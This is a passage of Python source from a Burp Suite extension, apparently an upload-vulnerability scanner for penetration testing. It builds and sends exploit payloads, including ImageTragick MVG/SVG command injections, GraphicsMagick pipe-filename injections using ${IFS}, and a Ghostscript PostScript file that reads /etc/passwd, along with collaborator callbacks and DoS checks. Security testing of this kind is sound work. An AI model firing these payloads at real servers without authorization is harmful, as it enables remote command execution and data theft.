                if len(resp) >= BurpExtender.MAX_RESPONSE_SIZE:
                    # Don't look at responses longer than MAX_RESPONSE_SIZE
                    return
                req = base_request_response.getRequest()
                if not req:
                    print "processHttpMessage called with BaseRequestResponse with no request. Ignoring."
                    return
                iRequestInfo = self._helpers.analyzeRequest(base_request_response)
                #print type(iRequestInfo.getUrl().toString()), repr(iRequestInfo.getUrl().toString())
                url = iRequestInfo.getUrl()
                if url:
                    url = FloydsHelpers.u2s(url.toString())
                else:
                    # Indeed the url might be None... according to https://github.com/modzero/mod0BurpUploadScanner/issues/17
                    return
                # ... do not scan things that are not "in scope" (see DownloadMatcherCollection class)
                # means we only check if we uploaded stuff to that host or the user configured
                # another host in the ReDownloader options that is therefore also "in scope"
                matchers = self.dl_matchers.get_matchers_for_url(url)
                if not matchers:
                    #We hit this for all not "in scope" requests
                    #we also hit it for URLs that can not be parsed by urlparse such as https://github.com/modzero/mod0BurpUploadScanner/issues/12
                    return
                iResponseInfo = self._helpers.analyzeResponse(base_request_response.getResponse())
                headers = [FloydsHelpers.u2s(x) for x in iResponseInfo.getHeaders()]
                body = FloydsHelpers.jb2ps(base_request_response.getResponse())[iResponseInfo.getBodyOffset():]
                # We do a small hack here: we iterate in reverse order (denoted with [::-1]) over the passive checks. We do that as
                # the thumbnail check that is done for image metadata is a little tricky: as the thumbnail image itself
                # is used as a regular test and another image file includes the contents of the thumbnail image as well, the wrong issue
                # would be shown. In other words: the entire thumbnail file is included in one of the image files. When we iterate
                # reversed, we hit the correct issue definition first.
                for matcher in list(matchers)[::-1]:
                    if matcher.matches(url, headers, body):
                        issue_copy = matcher.issue.create_copy()
                        if BurpExtender.MARKER_URL_CONTENT in issue_copy.detail:
                            if matcher.url_content:
                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
                                                                          matcher.url_content)
                            elif matcher.filename_content_disposition:
                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
                                                                              matcher.filename_content_disposition)
                            elif matcher.filecontent:
                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
                                                                              matcher.filecontent)
                            else:
                                issue_copy.detail = issue_copy.detail.replace(BurpExtender.MARKER_URL_CONTENT,
                                                                              "UNKNOWN")

                        self._create_download_scan_issue(base_request_response, issue_copy)

                        # As the matcher was now triggered, we can remove it as it should not trigger again,
                        # because every attack defines its own matcher
                        self.dl_matchers.remove_reported(url, matcher)

                        # At maximum there will be 1 scan issue per message, as it is unlikely that there is more than 1
                        # download in a HTTP message. Therefore we can use "return" after adding a scan issue.
                        return
        except:
            # I had enough of being the exception collector of processHttpMessage and python lib quirks...
            # no alerting of the user in this case anymore
            #self.show_error_popup(traceback.format_exc(), "processHttpMessage", base_request_response)
            raise sys.exc_info()[1], None, sys.exc_info()[2]

    def _create_download_scan_issue(self, base_request_response, issue):
        # For unknown reasons (probably Jython Vodoo) this doesn't work:
        # issue.servicePy = base_request_response.getHttpService()
        # issue.urlPy = self._helpers.analyzeRequest(base_request_response).getUrl()
        # Therefore we do this:
        issue.setHttpService(base_request_response.getHttpService())
        issue.setUrl(self._helpers.analyzeRequest(base_request_response).getUrl())

        issue.httpMessagesPy.append(base_request_response)
        self._add_scan_issue(issue)

    def _add_scan_issue(self, issue):
        print "Reporting", issue.name
        #print issue.toString()
        self._callbacks.addScanIssue(issue)

    # implement IScannerCheck
    def doPassiveScan(self, base_request_response):
        # see processHttpMessage which is a more general case of passive scan
        pass

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        #if existingIssue.getUrl() == newIssue.getUrl() and \
        #                existingIssue.getIssueName() == newIssue.getIssueName():
        #    return -1
        #else:
        return 0

    def doActiveScan(self, base_request_response, insertionPoint, options=None):
        try:
            # Also see getInsertionPoints
            if insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_PARAM_MULTIPART_ATTR:
                if insertionPoint.getInsertionPointName() == "filename":
                    req = base_request_response.getRequest()
                    if not req:
                        print "doActiveScan called with BaseRequestResponse with no request. Ignoring."
                        return
                    print "Multipart filename found!"
                    if not options:
                        options = self._global_opts
                    injector = MultipartInjector(base_request_response, options, insertionPoint, self._helpers, BurpExtender.NEWLINE)
                    self.do_checks(injector)
                else:
                    print "This is not a type file but something else in a multipart message:", insertionPoint.getInsertionPointName()
        except:
            self.show_error_popup(traceback.format_exc(), "doActiveScan", base_request_response)
            if options and options.redl_enabled:
                options.scan_was_stopped()
            raise sys.exc_info()[1], None, sys.exc_info()[2]

    # Implement IScannerInsertionPointProvider
    def getInsertionPoints(self, base_request_response):
        try:
            # TODO Burp API limitation: Is there another way to simply say "each active scanned HTTP request once"?
            # it seems not: https://support.portswigger.net/customer/en/portal/questions/16776337-confusion-on-insertionpoints-active-scan-module?new=16776337
            # So we are going to abuse a functionality of Burp called IScannerInsertionPoint
            # which is by coincidence always called once per request for every actively scanned item (with base_request_response)
            # this is an ugly hack...
            req = base_request_response.getRequest()
            if not req:
                # print "getInsertionPoints was called with a BaseRequestResponse where the Request was None/null..."
                return
            if "content-type: multipart/form-data" in FloydsHelpers.jb2ps(req).lower():
                print "It seems to be a mutlipart/form-data we don't need to check with the FlexiInjector"
            else:
                self.run_flexiinjector(base_request_response)
            # Now after the above hack, do what this function actually does, return insertion points
            if self._global_opts.modules['activescan'].isSelected():
                return InsertionPointProviderForActiveScan(self, self._global_opts, self._helpers).getInsertionPoints(base_request_response)
            else:
                return []
        except:
            self.show_error_popup(traceback.format_exc(), "BurpExtender.getInsertionPoints", base_request_response)
            raise sys.exc_info()[1], None, sys.exc_info()[2]

    def run_flexiinjector(self, base_request_response, options=None):
        fi = None
        if not options:
            options = self._global_opts
        try:
            if options.fi_ofilename:
                fi = FlexiInjector(base_request_response, options, self._helpers, BurpExtender.NEWLINE)
                # We test only those requests where we find at least the content in the request as some implementations
                # might not send the filename to the server
                if fi.get_uploaded_content():
                    print "FlexiInjector insertion point found!"
                    self.do_checks(fi)
                    return True
            elif not self._warned_flexiinjector:
                print "You did not specify the file you are going to upload, no FlexiInjector checks will be done"
                self._warned_flexiinjector = True
        except:
            self.show_error_popup(traceback.format_exc(), "run_flexiinjector", base_request_response)
            if fi and fi.opts.redl_enabled:
                fi.opts.scan_was_stopped()
            raise sys.exc_info()[1], None, sys.exc_info()[2]
        return False

    # The actual implementation of the scan logic from here
    def do_checks(self, injector):
        burp_colab = BurpCollaborator(self._callbacks)
        if not burp_colab.is_available:
            burp_colab = None
            print "Warning: No Burp Collaborator will be used"
        colab_tests = []

        # We need to make sure that the global download matchers are from now on active for the URL we scan
        url = FloydsHelpers.u2s(self._helpers.analyzeRequest(injector.get_brr()).getUrl().toString())
        self.dl_matchers.add_collection(url)

        scan_was_stopped = False

        try:
            # Sanity/debug check. Simply uploads a white picture called screenshot_white.png
            print "Doing sanity check and uploading a white png file called screenshot_white.png"
            self._sanity_check(injector)
            # Make sure we don't active scan again a request we are active scanning right now
            # Do this by checking for redl_enabled
            if injector.opts.modules['activescan'].isSelected() and injector.opts.redl_enabled:
                brr = injector.get_brr()
                service = brr.getHttpService()
                self._callbacks.doActiveScan(service.getHost(), service.getPort(), 'https' in service.getProtocol(), brr.getRequest())
            # Imagetragick - CVE based and fixed, will deprecate at one point
            if injector.opts.modules['imagetragick'].isSelected():
                print "\nDoing ImageTragick checks"
                colab_tests.extend(self._imagetragick_cve_2016_3718(injector, burp_colab))
                colab_tests.extend(self._imagetragick_cve_2016_3714_rce(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
                self._imagetragick_cve_2016_3714_sleep(injector)
                self._bad_manners_cve_2018_16323(injector)
            # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
            if injector.opts.modules['magick'].isSelected():
                print "\nDoing Image-/GraphicsMagick checks"
                colab_tests.extend(self._magick(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Ghostscript - CVE based and fixed, will deprecate at one point
            if injector.opts.modules['gs'].isSelected():
                print "\nDoing Ghostscript checks"
                colab_tests.extend(self._ghostscript(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # LibAVFormat - generic, as the file format will always support external URLs
            if injector.opts.modules['libavformat'].isSelected():
                print "\nDoing LibAVFormat checks"
                colab_tests.extend(self._libavformat(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # PHP RCEs - generic, as there will always be someone who screws up PHP:
            if injector.opts.modules['php'].isSelected():
                print "\nDoing PHP code checks"
                self._php_rce(injector)
            # JSP RCEs - generic, as there will always be someone who screws up JSP:
            if injector.opts.modules['jsp'].isSelected():
                print "\nDoing JSP code checks"
                self._jsp_rce(injector)
            # ASP RCEs - generic, as there will always be someone who screws up ASP:
            if injector.opts.modules['asp'].isSelected():
                print "\nDoing ASP code checks"
                self._asp_rce(injector)
            # htaccess - generic
            # we do the htaccess upload early, because if it enables "Options +Includes ..." by uploading a .htaccess
            # then we can successfully do Server Side Includes, CGI execution, etc. in a later module...
            if injector.opts.modules['htaccess'].isSelected():
                print "\nDoing htaccess/web.config checks"
                colab_tests.extend(self._htaccess(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # CGIs - generic
            if injector.opts.modules['cgi'].isSelected():
                print "\nDoing CGIs checks"
                colab_tests.extend(self._cgi(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # SSI - generic
            if injector.opts.modules['ssi'].isSelected():
                print "\nDoing SSI/ESI checks"
                colab_tests.extend(self._ssi(injector, burp_colab))
                colab_tests.extend(self._esi(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # XXE - generic
            if injector.opts.modules['xxe'].isSelected():
                print "\nDoing XXE checks"
                colab_tests.extend(self._xxe_svg_external_image(injector, burp_colab))
                colab_tests.extend(self._xxe_svg_external_java_archive(injector, burp_colab))
                colab_tests.extend(self._xxe_xml(injector, burp_colab))
                colab_tests.extend(self._xxe_office(injector, burp_colab))
                colab_tests.extend(self._xxe_xmp(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # XSS - generic
            if injector.opts.modules['xss'].isSelected():
                print "\nDoing XSS checks"
                self._xss_html(injector)
                self._xss_svg(injector)
                self._xss_swf(injector)
                self._xss_backdoored_file(injector)
            # eicar - generic
            if injector.opts.modules['eicar'].isSelected():
                print "\nDoing eicar checks"
                self._eicar(injector)
            # pdf - generic
            if injector.opts.modules['pdf'].isSelected():
                print "\nDoing pdf checks"
                colab_tests.extend(self._pdf(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # other ssrf - generic
            if injector.opts.modules['ssrf'].isSelected():
                print "\nDoing other SSRF checks"
                colab_tests.extend(self._ssrf(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # CSV/spreadsheet - generic
            if injector.opts.modules['csv_spreadsheet'].isSelected():
                print "\nDoing CSV/spreadsheet checks"
                colab_tests.extend(self._csv_spreadsheet(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # path traversal - generic
            if injector.opts.modules['path_traversal'].isSelected():
                print "\nDoing path traversal checks"
                self._path_traversal_archives(injector)
            # Polyglot - generic
            if injector.opts.modules['polyglot'].isSelected():
                print "\nDoing polyglot checks"
                colab_tests.extend(self._polyglot(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Fingerping - generic
            if injector.opts.modules['fingerping'].isSelected():
                print "\nDoing fingerping checks"
                self._fingerping(injector)

            # TODO feature: "Analyzer module"
            # new module that uploads a png, a jpeg, a gif, etc. and checks in the downloaded
            # content which byte sequences of a certain length (eg. 6) survived transformation on the server
            # basically we could use something like python's SequenceMatcher to check where the files match...
            # Additionally, make the module analyze certain things such as "if we upload a PNG, is the
            # returned content-type in the redownloader a PNG?" with other types as well
            # What would also be a nice feature is to upload a PNG and download it again. Then use that PNG
            # as a starting point for attacks as we can be sure that is a valid one.

            # Upload quirks - generic
            if injector.opts.modules['quirks'].isSelected():
                print "\nDoing quirk checks"
                self._quirks_with_passive(injector)
                self._quirks_without_passive(injector)
            # Generic URL replacer module - obviously generic
            if injector.opts.modules['url_replacer'].isSelected():
                print "\nDoing generic URL replacement checks"
                colab_tests.extend(self._generic_url_replacer(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Recursive uploader - generic
            if injector.opts.modules['recursive_uploader'].isSelected():
                print "\nDoing recursive upload checks"
                self._recursive_upload_files(injector, burp_colab)
            # Fuzz - generic
            if injector.opts.modules['fuzzer'].isSelected():
                print "\nDoing fuzzer checks"
                self._fuzz(injector)
        except StopScanException:
            scan_was_stopped = True

        # Just to make sure (maybe we write a new module above and forget this call):
        self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)

        # DoSing the server is best done at the end when we already know about everything else...
        # Timeout and DoS - generic
        if not scan_was_stopped:
            try:
                if injector.opts.modules['dos'].isSelected():
                    print "\nDoing timeout and DoS checks"
                    self._timeout_and_dos(injector)
            except StopScanException:
                pass
        if injector.opts.redl_enabled:
            injector.opts.scan_was_stopped()
        print "\nFinished"

    # Module functions
    def _sanity_check(self, injector):
        content = "eJzrDPBz5+WS4mJgYOD19HAJAtIrgXgmBxuQDFkv1cTAwFiT6ewc4OnsrBBQlJ+WmZPKwKAxMTkhQctTR+NEYmJCwomz2ppcRe" \
                  "VBHR09QQn7Dx84e+CwwpGEowrzZsTEPJAQeHC4Qbhm97EDHIv0Xzed8fr8p/Lysq01/8TM1s8sClO12vG1kbHcK6vQiJlZmX3C" \
                  "3DlBc+ZwpzxnuGl1ktVV1eEbj0L09j1LGI7YMaZ0izDKcqTcZ9x4WfENv0KZ0IyzR5jChIWe8KR4M9xk8hTYxtYxly8xuuHGSc" \
                  "lOTYdt7Cf0OqQPNFw+7HrwzoGg6xMbdnuy7bRcamDtsPDo5FniUjxF7AKnDSoMdhhoGMwwljCIMHphZDFtSdiUBhGr5+IhYqnL" \
                  "0qdoWDA5m4UetLTfvmCLylYP94PG+pH+7gdPHLjAsIRPJF1gsT17o2+6iHW/wOn4EwcSVp45cOBOs4D3rGMHNtTyMzcf0WyZcc" \
                  "qGja0um60t9zmXULfQQ770P8ecOuLnpOWwJH62MDTYcO/3//+bpZiZf6uwte0X/v///94X///v7278xvz4jQMfg0p55oOebCF+" \
                  "YDzMzQyJKInw9bFKzs/VS0zJT0rVq8gtYAABmworIDM3tSRRoSI3J6/YqsJWCazCCsgGCesrKYCVlGTbKkX4Big45xelKpjqme" \
                  "gZKNlxKSgo2BSlpFkFubhBtQN5tkoZJSUFVvr65eXleuXGevlF6fqGlpaW+gZG+kZGukAVusWVeSWJFbp5xcoQQ2DmuKQWJxdl" \
                  "FpRk5ucpgPiJSfmlJbZKSlA1EACxKLUiE2FTXjHUW0AP6oNk9A31DPThZoOMB4laBWRWpOZEuGTmpuYVA+2wMzSztNHHKoNVZy" \
                  "SSTlNjZJ2RGDpt9NE8BAktfWhw2XHZ6MOD3o7rEqOIDwMD02NPF8eQCsa3lw7yMijwHDFI+D+XO6nL5g6n38rve6L9Ggsahe+l" \
                  "zWLaz7BE4Qm3w6z6iY0TjCboM2T+c2VzOuWwj2HJT3FJDk3mn0wTnsWnKCzhGVU0qmiQKRJ/tZNVr/U4hzKo9PF09XNZ55TQBA" \
                  "B94FvQ".decode("base64").decode("zlib")
        types = [('', '.png', 'image/png')]
        self._send_simple(injector, types, "SanityCheck", content, redownload=False, randomize=False)

    def _imagetragick_cve_2016_3718(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['mvg'].isSelected():
            # burp collaborator based CVE-2016-3718
            basename = self.FILE_START + "Im18Colab"
            # tested to work on vulnerable ImageMagick:
            content_mvg = "push graphic-context\n" \
                          "viewbox 0 0 {} {}\n" \
                          "fill 'url({})'\n" \
                          "pop graphic-context".format(injector.opts.image_width, injector.opts.image_height, BurpExtender.MARKER_COLLAB_URL)

            name = "Imagetragick CVE-2016-3718"
            severity = "Medium"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an MVG imagetragick CVE-2016-3718 payload " \
                     "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                     "Check https://imagetragick.com/ for more details about CVE-2016-3718. Interactions for CVE-2016-3718:<br><br>"
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.IM_MVG_TYPES, basename, content_mvg, issue))
        return colab_tests

    def _imagetragick_cve_2016_3714_sleep(self, injector):
        # time based (sleep) CVE-2016-3714
        name = "Imagetragick CVE-2016-3714 (sleep based)"
        severity = "High"
        confidence = "Certain"
        detail = "A timeout was reliably detected twice when uploading an {} image with an imagetragick payload that " \
                 "executes the {} command to delay the response delivery. Therefore arbitrary command execution seems possible. " \
                 "Check https://imagetragick.com/ for more details, also check for CVE-2016-3717 manually."
        svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
              '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
              'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
              '<image xlink:href="' + BurpExtender.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}{}`" x="0" ' \
              'y="0" height="{}px" width="{}px"/></svg>'
        mvg = "push graphic-context\n" \
              "viewbox 0 0 {} {}\n" \
              "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "\";{} {}\"{})'\n" \
              "pop graphic-context"
        filename = self.FILE_START + "ImDelay"

        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
            if injector.opts.file_formats['mvg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("MVG", cmd), confidence, severity)
                content_mvg = mvg.format(injector.opts.image_width, injector.opts.image_height, cmd, injector.opts.sleep_time * factor, args)
                self._send_sleep_based(injector, filename + "Mvg" + cmd_name, content_mvg, self.IM_MVG_TYPES, injector.opts.sleep_time, issue)
            if injector.opts.file_formats['svg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("SVG", cmd), confidence, severity)
                content_svg = svg.format(injector.opts.image_width, injector.opts.image_height, cmd, injector.opts.sleep_time * factor, args, injector.opts.image_height, injector.opts.image_width)
                self._send_sleep_based(injector, filename + "Svg" + cmd_name, content_svg, self.IM_SVG_TYPES, injector.opts.sleep_time, issue)

        return []

    def _bad_manners_cve_2018_16323(self, injector):
        if not injector.opts.redl_enabled or not injector.opts.redl_configured:
            # this module can only find leaks in images when the files are downloaded again
            return
        # CVE-2018-16323, see https://github.com/ttffdd/XBadManners
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BadManners"
        content = Xbm("".join(random.sample(string.ascii_letters, 5))).create_xbm(injector.opts.image_width,
                                   injector.opts.image_height)
        urrs = self._send_simple(injector, self.XBM_TYPES, basename, content, redownload=True)
        for urr in urrs:
            if urr and urr.download_rr:
                resp = urr.download_rr.getResponse()
                if resp:
                    resp = FloydsHelpers.jb2ps(resp)
                    i_response_info = self._helpers.analyzeResponse(urr.download_rr.getResponse())
                    body_offset = i_response_info.getBodyOffset()
                    body = resp[body_offset:]
                    picture_width, picture_height, fileformat = ImageHelpers.image_width_height(body)
                    if picture_width and picture_height and fileformat:
                        has_been_resized = False
                        if picture_width >= 200 or picture_height >= 200:
                            # We first resize the picture to a small one so we don't have to check
                            # too many pixels (performance)...
                            thumbnail = ImageHelpers.rescale_image(200, 200, body)
                            if thumbnail:  # only if body was an image that ImageIO can parse
                                # Now get the pixels of the picture
                                body = thumbnail
                                has_been_resized = True
                                picture_width = 200
                                picture_height = 200
                        rgbs = ImageHelpers.get_image_rgb_list(body)
                        # As we send a first byte that is not white,
                        # let's ignore the first few pixels... (that's what a non-vulnerable imagemagick turns black)
                        for i in range(0, picture_width/4):
                            rgbs[i] = -1
                        body = ImageHelpers.get_image_from_rgb_list(picture_width, picture_height, fileformat, rgbs)
                        white = rgbs.count(-1)
                        # When doing "convert in.xbm out.png", the resulting PNG has only -16777216 as black...
                        black = 0
                        black_rgb_values = [-16777216]
                        # But with "convert in.xbm -size widthxheight out.jpeg", the resulting JPEG has as well others
                        # which are black pixels turned into gray values
                        # so this is not super accurate, but it doesn't matter too much, because the real false positive
                        # will be decided with is_grayscale
                        black_rgb_values.extend([-263173, -197380, -131587, -65794, -131587, -12434878, -657931,
                                                 -855310, -394759, -592138, -526345, -328966, -986896, -460552])
                        for value in black_rgb_values:
                            black += rgbs.count(value)
                        other = len(rgbs) - white - black
                        examples = [x for x in rgbs if x != -1 and x not in black_rgb_values]
                        other_examples = set(examples[:50])
                        if white < picture_width * picture_height:
                            # We uploaded a white picture, but we got something with not only white pixels
                            if ImageHelpers.is_grayscale(body):
                                # When it was resized, and it is only grayscale, then this could really be a true positive
                                # Black pixels often go gray when an image is resized (on the server side or here what we
                                # just did for performance reason) to a smaller size
                                name = "Bad Manners (CVE-2018-16323)"
                                severity = "High"
                                if other > 0:
                                    confidence = "Tentative"
                                else:
                                    confidence = "Firm"
                                detail = "The server might use a vulnerable version of Imagemagick. It is vulnerable to " \
                                     "CVE-2018-16323, see https://github.com/ttffdd/XBadManners. We uploaded a " \
                                     "fully white XBM file format picture (black and white format) with a known memory " \
                                     "disclosure payload and the server sent back an image that has not only white pixels. " \
                                     "This could also just mean that the server adds other colors to our picture, which is " \
                                     "countered by checking that the image is only grayscale. The image returned was only " \
                                     "grayscale. However, if the server modifies white picture to include gray or black " \
                                     "pixels this could still be a false positive. Please verify manually. <br>" \
                                     "Number of white pixels: {} <br>" \
                                     "Number of black/gray pixels (estimation): {} <br>" \
                                     "Number of other pixels (estimation): {} <br>" \
                                     "First 50 other pixel RGB integer values: <br>" \
                                     "{}".format(white, black, other, other_examples)
                                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                                issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                                self._add_scan_issue(issue)
                            #else:
                                #print "Although we uploaded a white XBM picture, the server returned a non-grayscale picture..."

    def _imagetragick_cve_2016_3714_rce(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests

        # burp collaborator based CVE-2016-3714
        name = "Imagetragick CVE-2016-3714 (collaborator based)"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading a {} imagetragick CVE-2016-3714 payload " \
                 "which contains a burp colaborator payload as a {} command. Therefore arbitrary command execution seems possible. " \
                 "Check https://imagetragick.com/ for more details about CVE-2016-3714. Interactions for CVE-2016-3718:<br><br>"

        svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
              '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
              'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
              '<image xlink:href="' + BurpExtender.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}`" x="0" ' \
              'y="0" height="{}px" width="{}px"/></svg>'
        mvg = "push graphic-context\n" \
              "viewbox 0 0 {} {}\n" \
              "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "\";{} \"{})'\n" \
              "pop graphic-context"

        basename = self.FILE_START + "Im3714"

        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            if injector.opts.file_formats['mvg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("MVG", cmd), confidence, severity)
                content_mvg = mvg.format(injector.opts.image_width, injector.opts.image_height, cmd, server)
                colab_tests.extend(self._send_collaborator(injector, burp_colab, self.IM_MVG_TYPES, basename + "Mvg" + cmd_name,
                                                           content_mvg, issue, replace=replace))

            if injector.opts.file_formats['svg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("SVG", cmd), confidence, severity)
                content_svg = svg.format(injector.opts.image_width, injector.opts.image_height, cmd, server,
                                         injector.opts.image_height, injector.opts.image_width)
                colab_tests.extend(self._send_collaborator(injector, burp_colab, self.IM_SVG_TYPES, basename + "Svg" + cmd_name,
                                                           content_svg, issue, replace=replace))

        return colab_tests

    def _magick(self, injector, burp_colab):
        colabs = []
        # burp collaborator based passing a filename starting with
        # pipe | makes Image-/GraphicsMagick execute to the -write command
        # As described on https://hackerone.com/reports/212696
        types = [('', BurpExtender.MARKER_ORIG_EXT, '')]
        content = injector.get_uploaded_content()
        name = "Image-/GraphicsMagick filename RCE"
        severity = "High"
        confidence = "Certain"
        base_details = "The manual for GrapicksMagick on http://www.graphicsmagick.org/GraphicsMagick.html specifies: <br>" \
                       "-write &lt;filename&gt; <br>" \
                       "[...] <br>" \
                       "Precede the image file name with | to pipe to a system command. <br><br>" \
                       "Check https://hackerone.com/reports/212696 for more details. "
        detail_colab = "A Burp Colaborator interaction was detected when uploading a filename using a pipe character or similar " \
                        "which included a {} payload with a burp colaborator URL. This means that Remote Command Execution should be possible. " \
                        "The payload template was {} . Interactions:<br><br>"
        detail_sleep = "A delay in the response time was detected twice when uploading a filename using a pipe character or similar " \
                       "which included a {} payload. This means that Remote Command Execution should be possible. " \
                       "The payload template was {} . "

        # Sleep based
        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
            basenames = [ "|{} {}{}|a".format(cmd, injector.opts.sleep_time * factor, args),
                          #"|{}%20{}{}|a".format(cmd.replace(" ", "%20"), injector.opts.sleep_time * factor, args.replace(" ", "%20")),
                          "|" + cmd.replace(" ", "${IFS}") + "${IFS}" + str(injector.opts.sleep_time * factor) + args.replace(" ", "%20") + "|a",
                          "1%20-write%20|{}%20{}{}|a".format(cmd.replace(" ", "%20"), injector.opts.sleep_time * factor, args.replace(" ", "%20")),
                          "1${IFS}-write${IFS}|" + cmd.replace(" ", "${IFS}") + "${IFS}" + str(injector.opts.sleep_time * factor) + args.replace(" ", "${IFS}") + "|a",
                          ]
            for basename in basenames:
                details = base_details + detail_sleep.format(cmd_name, basename)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                self._send_sleep_based(injector, basename, content, types, injector.opts.sleep_time, issue)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colabs

        # Colab based
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            basenames = [ "|{} {}|a".format(cmd, server),
                          #"|{}%20{}|a".format(cmd.replace(" ", "%20"), server),
                          "|" + cmd.replace(" ", "${IFS}") + "${IFS}" + server + "|a",
                          "1%20-write%20|{}%20{}|a".format(cmd.replace(" ", "%20"), server),
                          "1${IFS}-write${IFS}|" + cmd + "${IFS}" + server + "|a",
                          ]
            for basename in basenames:
                details = base_details + detail_colab.format(cmd_name, basename)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                # print "Sending basename, replace", repr(basename), repr(replace)
                colabs.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue, replace=replace))

        return colabs

    def _ghostscript(self, injector, burp_colab):

        # CVE-2016-7977
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "GsLibPasswd"
        content = """%!PS
/Size 20 def                             % font/line size
/Line 0 def                              % current line
/Buf 1024 string def                     % line buffer
/Path 0 newpath def
>
/Courier-Bold findfont Size scalefont setfont
1 1 1 setrgbcolor clippath fill          % draw white background
0 0 0 setrgbcolor                        % set black foreground
>
(/etc/passwd) .libfile {
    {
        dup Buf readline
        {
            Path Line moveto show
        }{
            showpage
            quit
        } ifelse
        % next line
        /Line Line Size add def
    } loop
} if"""
        # As we do not want to regex search with a DownloadMatcher (too error prone), we only check if a ReDownloader
        # was configured and we know the response
        urrs = self._send_simple(injector, self.GS_TYPES, basename, content, redownload=True)
        for urr in urrs:
            if urr and urr.download_rr:
                resp = urr.download_rr.getResponse()
                if resp:
                    resp =  FloydsHelpers.jb2ps(resp)
                    if BurpExtender.REGEX_PASSWD.match(resp):
                        name = "Ghostscript Local File Include"
                        severity = "High"
                        confidence = "Firm"

                        detail = "A passwd-like response was downloaded when uploading a ghostscript file with a payload that " \
                                 "tries to include /etc/passwd. Therefore arbitrary file read seems possible. " \
                                 "See http://www.openwall.com/lists/oss-security/2016/09/30/8 for details. " \
                                 "Interactions: <br><br>"
                        issue = self._create_issue_template(injector.get_brr(), name + " CVE-2016-7977", detail, confidence, severity)
                        issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                        self._add_scan_issue(issue)

        # CVE-2016-7976 with OutputICCProfile pipe technique
        # CVE-2017-8291 with OutputFile pipe technique
        # TODO feature: look at ghostbutt.com and metasploit implementation and see how they are doing it
        name = "Ghostscript RCE"
        severity = "High"
        confidence = "Certain"
        base_detail = "A ghostscript file with RCE payload was uploaded. See " \
                      "http://www.openwall.com/lists/oss-security/2016/09/30/8 and http://cve.circl.lu/cve/CVE-2017-8291 " \
                      "and http://openwall.com/lists/oss-security/2018/08/21/2 for details. "
        detail_sleep = "A delay was dectected twice when uploading a ghostscript file with a payload that " \
                       "executes a sleep like command. Therefore arbitrary command execution seems possible. " \
                       "The payload used the {} argument ({}) and the payload {}."
        detail_colab = "A burp collaborator interaction was dectected when uploading a ghostscript file with a payload that " \
                       "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
